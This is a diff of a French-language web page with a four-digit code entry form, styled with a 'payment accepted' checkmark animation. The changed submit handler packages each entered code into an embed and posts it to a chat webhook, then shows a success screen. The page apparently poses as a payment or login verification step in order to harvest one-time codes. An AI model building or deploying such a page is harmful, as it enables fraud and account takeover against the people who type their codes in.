@@ -95,7 +95,14 @@
       font-size: 13px;
     }
 
-    /* Animation checkmark style paiement accepté */
+    .message.error {
+      color: #d32f2f;
+    }
+
+    .message.success {
+      color: #28a745;
+    }
+
     .success-animation {
       display: none;
       justify-content: center;
@@ -116,7 +123,6 @@
       box-shadow: 0 0 8px #28a74599;
     }
 
-    /* SVG checkmark styles */
     svg {
       width: 36px;
       height: 36px;
@@ -209,66 +215,46 @@
       });
     });
 
-form.addEventListener("submit", async function(e) {
-  e.preventDefault();
-  const code = Array.from(inputs).map(input => input.value).join('');
+    form.addEventListener("submit", async function(e) {
+      e.preventDefault();
 
-  if (code.length !== 4 || !/^\d{4}$/.test(code)) {
-    messageEl.textContent = "Code invalide.";
-    messageEl.className = "message error";
-    return;
-  }
+      const code = Array.from(inputs).map(input => input.value).join('');
 
-  const embed = {
-    color: 0x1e1e26,
-    title: "🔒 Code de vérification",
-    description: `### \`${code}\`\n> ⚠️ Ne partagez ce code avec personne`,
-    thumbnail: {
-      url: "https://media.tenor.com/BSY1qTH8g-oAAAPo/check.gif"
-    },
-    footer: {
-      text: `⏰ ${new Date().toLocaleString('fr-FR')} · Expire dans 5 min`
-    }
-  };
+      if (code.length !== 4 || !/^\d{4}$/.test(code)) {
+        messageEl.textContent = "Code invalide.";
+        messageEl.className = "message error";
+        return;
+      }
 
-  try {
-    const res = await fetch("WEBHOOK_URL_ICI", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ embeds: [embed] })  // ← embeds est un tableau !
-    });
-
-    if (res.ok) {
-      messageEl.textContent = "Code envoyé !";
-      messageEl.className = "message success";
-    } else {
-      throw new Error(`HTTP ${res.status}`);
-    }
-  } catch (err) {
-    messageEl.textContent = "Erreur lors de l'envoi.";
-    messageEl.className = "message error";
-    console.error(err);
-  }
-});
-
+      const embed = {
+        color: 0x1e1e26,
+        title: "Code de vrification",
+        description: "### `" + code + "`\n> ⚠️ Ne partagez ce code avec personne",
+        thumbnail: {
+          url: "https://media.tenor.com/BSY1qTH8g-oAAAPo/check.gif"
+        },
+        footer: {
+          text: "" + new Date().toLocaleString('fr-FR') + "  Expire dans 5 min"
+        }
+      };
 
       try {
-        const resp = await fetch(webhookURL, {
+        const res = await fetch(webhookURL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: msg })
+          body: JSON.stringify({ embeds: [embed] })
         });
 
-        if (resp.ok) {
-          // Affiche animation de validation
+        if (res.ok) {
           container.classList.add("validated");
           messageEl.textContent = "";
         } else {
-          throw new Error("Échec de l'envoi");
+          throw new Error("HTTP " + res.status);
         }
       } catch (err) {
         messageEl.textContent = "Erreur lors de l'envoi.";
         messageEl.className = "message error";
+        console.error(err);
       }
     });
   </script>
